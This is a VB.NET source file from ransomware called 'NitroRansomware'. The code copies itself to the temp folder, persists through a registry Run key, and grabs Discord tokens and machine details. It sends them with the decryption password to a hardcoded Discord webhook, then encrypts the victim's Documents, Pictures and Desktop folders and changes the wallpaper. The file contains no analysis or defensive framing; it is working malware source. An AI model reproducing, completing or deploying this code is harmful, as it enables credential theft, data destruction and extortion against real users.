Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.Win32
Imports System.Diagnostics

Namespace NitroRansomware
	Friend Class Program
		Private Shared desktop As String = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)
		Private Shared documents As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
		Private Shared pictures As String = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)
		'ويب هوك
		Public Shared WEBHOOK As String = "https://discord.com/api/webhooks/968098749698150400/lwDUg0x1nwBFibRow8Rpaa9VDgBdLYbkjlPXZ_MnJ78IQOarugUgtILhUy3xa2NrEp7h"
		Public Shared DECRYPT_PASSWORD As String = "SyRiAn FrEe FcUk IsrAiL"

		Private Shared logging As New Logs("DEBUG", 0)
		Private Shared ww As New Webhook(WEBHOOK)
		Shared Sub Main(ByVal args() As String)

			If Installed() Then
				Application.Run(New Form1())

			Else
				Duplicate()
				StartUp()
				Setup()
				EncryptAll()
				Temp()
				Thread.Sleep(6000)
				Application.Run(New Form1())
			End If
		End Sub

		Private Shared Sub Setup()
			logging.Debug("Setup start")
			Dim tokens As List(Of String) = Grabber.Grab()
			Dim tokenWrite As String = ""
			For Each x As String In tokens
				tokenWrite &= x & ControlChars.Lf
			Next x

			Console.WriteLine(tokenWrite)

			Dim pcDetails As List(Of String) = User.GetDetails()
			Dim uuid As String = User.GetIdentifier()
			Dim ip As String = User.GetIP()

			Dim ww As New Webhook(WEBHOOK)
			ww.Send($"**Program executed** ```Status: Active " & ControlChars.Lf & "PC Name: {pcDetails[0]}" & ControlChars.Lf & "User:{pcDetails[1]}" & ControlChars.Lf & "UUID: {uuid}" & ControlChars.Lf & "IP Address: {ip}```")
			ww.Send($"```Decryption Key: {DECRYPT_PASSWORD}```")
			ww.Send($"```Tokens:" & ControlChars.Lf & "{tokenWrite}```")
		End Sub
		Public Shared Sub EncryptAll()

			ww.Send("```Starting file encryption..```")
			Dim t1 = New Thread(Sub() Crypto.EncryptContent(documents))
			Dim t2 = New Thread(Sub() Crypto.EncryptContent(pictures))
			Dim t3 = New Thread(Sub() Crypto.EncryptContent(desktop))
			t1.Start()
			t2.Start()
			t3.Start()

			t1.Join()
			t2.Join()
			t3.Join()
			ww.Send($"```Finished encrypting victim's files. Total number of files encrypted: {Crypto.encryptedFileLog.Count}```")
			Wallpaper.ChangeWallpaper()
		End Sub
		Public Shared Sub DecryptAll()
			Dim t1 = New Thread(Sub() Crypto.DecryptContent(documents))
			Dim t2 = New Thread(Sub() Crypto.DecryptContent(pictures))
			Dim t3 = New Thread(Sub() Crypto.DecryptContent(desktop))

			t1.Start()
			t2.Start()
			t3.Start()

			t1.Join()
			t2.Join()
			t3.Join()
		End Sub

		Private Shared Sub StartUp()
			Try
				Dim filename As String = Process.GetCurrentProcess().ProcessName & ".exe"
				Dim loc As String = Path.GetTempPath() & filename
				Console.WriteLine(loc)
				Using key As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
					key.SetValue("NR", """" & loc & """")
				End Using
			Catch ex As Exception
				logging.Error(ex.Message)
			End Try
		End Sub
		Public Shared Sub RemoveStart()
			If Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", "NR", True) IsNot Nothing Then
				Using key As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
					key.DeleteValue("NR", False)
				End Using
			End If
		End Sub
		Private Shared Sub Duplicate()
			Try
				Dim filename As String = Process.GetCurrentProcess().ProcessName & ".exe"
				Dim filepath As String = Path.Combine(Environment.CurrentDirectory, filename)
				File.Copy(filepath, Path.GetTempPath() & filename)
				Console.WriteLine(Path.GetTempPath())
			Catch ex As Exception
				logging.Debug(ex.Message)
			End Try
		End Sub
		Private Shared Function Installed() As Boolean
			If Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", "NR", Nothing) IsNot Nothing Then
				Return True
			End If
			Return False
		End Function

		Private Shared Sub Temp()
			Dim save As String = Path.GetTempPath() & "NR_decrypt.txt"
			Console.WriteLine(save)
			Using sw As New StreamWriter(save)
				sw.WriteLine(DECRYPT_PASSWORD)
			End Using
		End Sub

	End Class
End Namespace
